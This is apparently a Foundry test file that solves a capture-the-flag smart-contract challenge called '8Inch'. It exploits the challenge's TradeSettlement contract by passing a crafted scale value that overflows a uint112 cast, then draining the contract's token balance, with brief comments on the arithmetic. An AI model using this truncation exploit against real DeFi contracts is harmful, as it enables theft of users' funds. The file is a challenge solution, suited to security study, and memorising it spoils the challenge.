pragma solidity ^0.8.0;

import {TradeSettlement, Challenge} from "../src/8Inch.sol";
import {IERC20} from "../src/ERC20.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract TSTest is Test {
    Challenge challenge;
    function setUp() public {
        challenge = new Challenge();
    }

    function test_tradeSettlement() public {
        TradeSettlement tradeSettlement = challenge.tradeSettlement();
        address wojak = address(challenge.wojak());
        address weth = address(challenge.weth());
        for (uint256 i = 0; i < 10; i++) {
            tradeSettlement.settleTrade(0, 9);
        }

        IERC20(wojak).approve(address(tradeSettlement), type(uint256).max);
        tradeSettlement.createTrade(wojak, weth, 31, 0);
        tradeSettlement.scaleTrade(1, 5192296858534827628530496329220066);
        tradeSettlement.settleTrade(1, IERC20(wojak).balanceOf(address(tradeSettlement)));
        IERC20(wojak).transfer(address(0xc0ffee), 10 ether);
        console.log(challenge.isSolved());

    }
}



// type112(1e18 * scale)  => 1e18
// 1e7 * scale => 1